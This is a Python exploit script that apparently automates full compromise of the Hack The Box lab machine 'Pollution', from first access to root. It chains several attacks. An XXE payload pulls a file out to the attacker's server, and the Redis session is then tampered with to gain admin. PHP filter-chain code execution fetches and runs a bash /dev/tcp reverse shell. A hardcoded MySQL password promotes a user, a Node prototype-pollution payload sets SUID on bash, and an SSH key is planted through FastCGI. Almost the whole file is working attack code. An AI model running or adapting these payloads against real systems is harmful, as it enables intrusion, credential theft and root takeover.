#!/usr/bin/python3

import argparse
import sys
import requests
import string
import random
import json
import threading
import base64
import redis
import paramiko
import io
import base64
from pwn import *
from time import sleep
from http.server import BaseHTTPRequestHandler, HTTPServer
from Crypto.PublicKey import RSA
from php_filter_chain_generator import generate_filter_chain

class MyHttpServer(BaseHTTPRequestHandler):
	def __init__(self, *args, **kwargs):
				self.phpserssid = phpsessid
				self.username = username
				super().__init__(*args, **kwargs)

	def log_message(self, format, *args):
		return

	def do_GET(self):
		if self.path.startswith('/?pl='):
			print("[+] Serving bad dtd payload...")
			payload = f'''<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../bootstrap.php'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{local_ip}:80/?x=%file;'>">
%eval;
%exfiltrate;'''
			self.send_response(200)
			self.send_header('Content-type', 'text/plain')
			self.end_headers()

			response = payload
			self.wfile.write(response.encode('utf-8'))
			return
		elif self.path.startswith('/?x='):
			# We get the secret password to REDIS. Lets pass it on and make our registered user an Authenticated Admin user
			url_arg = self.path.split('=')[1]
			if url_arg:
				while len(url_arg) % 4 != 0:
					url_arg += '='

				print(f"[+] Exfiltrated: {url_arg}")
				decoded_bytes = base64.b64decode(url_arg)
				decoded_string = decoded_bytes.decode('utf-8')
				redis_password = extract_password(decoded_string)
				print(f"[+] redis password: {redis_password}")

				self.send_response(200)
				self.send_header('Content-type', 'text/plain')
				self.end_headers()

				response = 'OK'
				self.wfile.write(response.encode('utf-8'))

				threading.Thread(target=connect_to_redis, args=(self.phpserssid, self.username, redis_password)).start()
				return
		elif self.path == '/b':
			self.send_response(200)

			b_file = f"bash -i >& /dev/tcp/{local_ip}/{reverse_call_port} 0>&1"
			response = b_file.encode()

			self.send_header('Content-Length', len(response))
			self.end_headers()
			
			self.wfile.write(response)
		elif self.path == '/vic':
			self.send_response(200)

			key = RSA.generate(2048)
			private_key = key.exportKey('PEM') 
			public_rsa_key = key.publickey().exportKey('OpenSSH')

			with open("./id_rsa", "w") as f:
				f.write(private_key.decode())
			
			payload_base = f"<?php system('echo \"{public_rsa_key.decode()}\" > /home/victor/.ssh/authorized_keys');"
			base64_payload = b64e(payload_base.encode())
			payload = f"""#!/bin/bash
env -i \
PHP_VALUE=$"allow_url_include=1\nallow_url_fopen=1\nauto_prepend_file='data://text/plain\;base64,{base64_payload}'" \
SCRIPT_FILENAME="/var/www/developers/bootstrap.php" SCRIPT_NAME="/var/www/developers/bootstrap.php" REQUEST_METHOD=POST \
cgi-fcgi -bind -connect 127.0.0.1:9000"""
			
			response = payload.encode()
			self.send_header('Content-Length', len(response))
			self.end_headers()
			self.wfile.write(response)

		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

		# Replace with your default response content
		response = 'This is a default GET request.'
		self.wfile.write(response.encode('utf-8'))

def extract_password(response:str) -> str:
    start_index = response.find('auth=') + len('auth=')
    end_index = response.find("'", start_index)
    password = response[start_index:end_index]
    return password

def random_string(length: int = 8, charset: str = string.ascii_lowercase) -> str:
    return "".join(random.choices(charset, k=length))

def connect_to_redis(phpsessid:str, username:str, redis_pass:str):
	redis_host = remote_ip
	redis_port = 6379

	redis_client = redis.Redis(host=redis_host, port=redis_port, password=redis_pass)
	redis_client.execute_command('SELECT', '0')
	redis_key = f"PHPREDIS_SESSION:{phpsessid}"
	redis_value = redis_client.get(redis_key)
	print(f"[+] For redis key [{redis_key}] value is: {redis_value}")

	# Perform Redis operations
	new_value = f"username|s:8:\"{username}\";role|s:5:\"admin\";auth|s:4:\"True\";"
	redis_client.set(redis_key, new_value)
	value = redis_client.get(redis_key)
	print(f"[+] Updated redis key [{redis_key}] value is: {value}")

	print("[+] Lets PHP FILTER2RCE...!")
	redis_client.close()

	# Now that the user is admin and authenticated, we will get a reverse shell as www-data by using php filter chains
	start_php2rce_to_pwntools(username)
	exploit_developers_page_to_gain_shell(phpsessid)

def init_php2rce_to_pwntools(username:str):                                                                                                             
	print("[+] Starting pwntools reverse shell listener")
	loc_p = int(reverse_call_port)
	l = listen(loc_p)
	conn = l.wait_for_connection()
	
	# Once the php filter chains exploit occurs, we will get a reverse shell here.
	# Now we will privesc straight to root.

	# First, register our user to the pollution_api registry
	register_in_admin()

	# Promote that user to an admin role for the pollution_api
	set_user_as_admin_in_pollution_api(conn)
	sleep(2)

	# Login with this new admin user and get a x-access-token token
	x_access_token = login_in_admin()
	print(f"[+]\n\t|username: {username} |\n\t|password: password123 |\n\t|phpsessid: {phpsessid} |\n\t|x-access-token: {x_access_token} |")

	# With the x-access-token we can now issue a command to the pollution_api and exploit a prototype pollution vulnerability in index.js
	# This will create for us a bash +s binary as root
	exploit_prototype_pollution(conn, x_access_token)

	# Uncomment this if you want an id_rsa file to be generated locally and saved so you can ssh as victor manually.
	# get_victor(conn)

	# Now a simple bash -p command and we are root.
	pwn_root(conn)

	conn.interactive()

def pwn_root(conn):
	export_term = b"export TERM=screen"
	conn.sendline(export_term)

	clear_scr = b"clear"
	conn.sendline(clear_scr)

	sleep(1)
	payload = b"bash -p"
	conn.sendline(payload)

	sleep(1)
	clear_scr = b"clear"
	conn.sendline(clear_scr)

	sleep(1)
	whoami = b"id"
	conn.sendline(whoami)

def exploit_prototype_pollution(conn, x_access_token:str):
	payload = """'{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\\"child_process\\").execSync(\\"chmod +s /usr/bin/bash\\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'"""
	command = f"""curl -H "Content-Type: application/json" -d {payload} -H "x-access-token: {x_access_token}" -X POST 127.0.0.1:3000/admin/messages/send"""
	conn.sendline(command.encode())

def set_user_as_admin_in_pollution_api(conn):
	print("[+] Promoting pollution_api user to admin")
	payload = f"mysql -u webapp_user -pStr0ngP4ssw0rdB*12@1 -e \"UPDATE pollution_api.users SET role='admin' WHERE username='{username}';\""
	conn.sendline(payload.encode())
	
def get_victor(conn):
	payload = f"wget -q -O - {local_ip}/vic|bash"
	conn.sendline(payload.encode())

def start_php2rce_to_pwntools(username:str):
    t = threading.Thread(target=init_php2rce_to_pwntools, args=(username,))
    t.start()

def exploit_developers_page_to_gain_shell(phpsessid:str):
	print("[+] Exploiting PHP filter chains")
	sleep(2)
	chain_payload = f'<?=`wget -O - {local_ip}/b|bash`?>'
	chain = chain_payload.encode('utf-8')
	base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")

	php_filters_chain = generate_filter_chain(base64_value)
	url = f"http://developers.collect.htb:80/?page={php_filters_chain}"
	cookies = {"PHPSESSID": f"{phpsessid}"}
	headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic ZGV2ZWxvcGVyc19ncm91cDpyMGNrZXQ=", "Connection": "close", "Referer": "http://developers.collect.htb/?page=projects", "Upgrade-Insecure-Requests": "1"}
	response = requests.get(url, headers=headers, cookies=cookies)

def register_user():
	url = "http://pollution.htb:80/register"
	data = {"username": username, "password": password}
	response = session.post(url, data=data, allow_redirects=True)

	if response.status_code == 200:
		phpsessid = login_user()
		print(f"[+] User [{username}] registered successfully with  phpsessid: {phpsessid}")
		return phpsessid
	else:
		print(f"[!] User registration failed: {response.text}")
		exit()

def login_user() -> str:
	url = "http://pollution.htb:80/login"
	data = {"username": username, "password": password}
	response = session.post(url, data=data, allow_redirects=True)

	if response.status_code == 200:
		print(f"[+] User [{username}] loggedin successfully")
		phpsessid = session.cookies.get('PHPSESSID')
		return phpsessid
	else:
		print(f"[!] User login failed: {response.text}")
		exit()

def promote_to_admin():
	url = "http://pollution.htb:80/set/role/admin"
	data = {"token": "ddac62a28254561001277727cb397baf"}
	response = session.post(url, data=data, allow_redirects=True)

	if response.status_code == 200:
		print(f"[+] User promoted to admin successfully")
	else:
		print(f"[!] User failed to promote to admin: {response.text}")
		exit()

def start_http_server():
	with HTTPServer(("", 80), MyHttpServer) as server:
		server.serve_forever()

def init_http_server():
	print("[+] Starting http server")
	thread = threading.Thread(target=start_http_server)
	thread.start()

def pwn_to_root() -> str:
	# Using an xxe vulnerability we will make the remote machine request a bad.dtd file. That file will return to us the password for REDIS
	sleep(1)
	url = "http://pollution.htb:80/api"
	xxe_payload = f"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{local_ip}/?pl=bad.dtd\"> %xxe;]>"
	payload = f"<?xml version=\"1.0\" encoding=\"UTF-8\"?>{xxe_payload}<root><method>POST</method><uri>/auth/register</uri><user><username>{username}</username><password>{password}</password></user></root>"
	data = {"manage_api": payload}
	response = session.post(url, data=data)

	if response.status_code == 200:
		print(f"[+] xxe payload sent successfully")
	else:
		print(f"[!] xxe payload failed: {response.text}")
		exit()

def register_in_admin():
	url = "http://pollution.htb:80/api"
	data = {"manage_api": f"<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><method>POST</method><uri>/auth/register</uri><user><username>{username}</username><password>{password}</password></user></root>"}
	response = session.post(url, data=data)

	if response.status_code == 200:
		print(f"[+] User registered to Pollution API successfully")
	else:
		print(f"[!] User failed to register to Pollution API: {response.text}")
		exit()

def login_in_admin() -> str:
	print("[+] Obtaining x-access-token")
	sleep(1)
	url = "http://pollution.htb:80/api"
	data = {"manage_api": f"<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><method>POST</method><uri>/auth/login</uri><user><username>{username}</username><password>{password}</password></user></root>"}
	response = session.post(url, data=data)

	if response.status_code == 200:
		print(f"[+] User logged in to Pollution API successfully")
		json_data = response.json()
		parsed_object = json.loads(json.dumps(json_data))
		x_token = parsed_object['Header']['x-access-token']
		return x_token
	else:
		print(f"[!] User failed to register to Pollution API: {response.text}")
		exit()


if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Auto pwn straight to root")
	parser.add_argument("--remote-ip", type=str, help="Remote IP address", default="10.10.11.192")
	parser.add_argument("--local-ip", type=str, help="Local IP address", default="10.10.14.14")
	parser.add_argument("--local-port", type=int, help="Local PORT for reverse callback", default=8001)

	args = parser.parse_args()

	session = requests.session()
	remote_ip = args.remote_ip
	local_ip = args.local_ip
	reverse_call_port = args.local_port
	password = "password123"
	username = random_string()

	phpsessid = register_user()
	promote_to_admin()

	init_http_server()
	pwn_to_root()

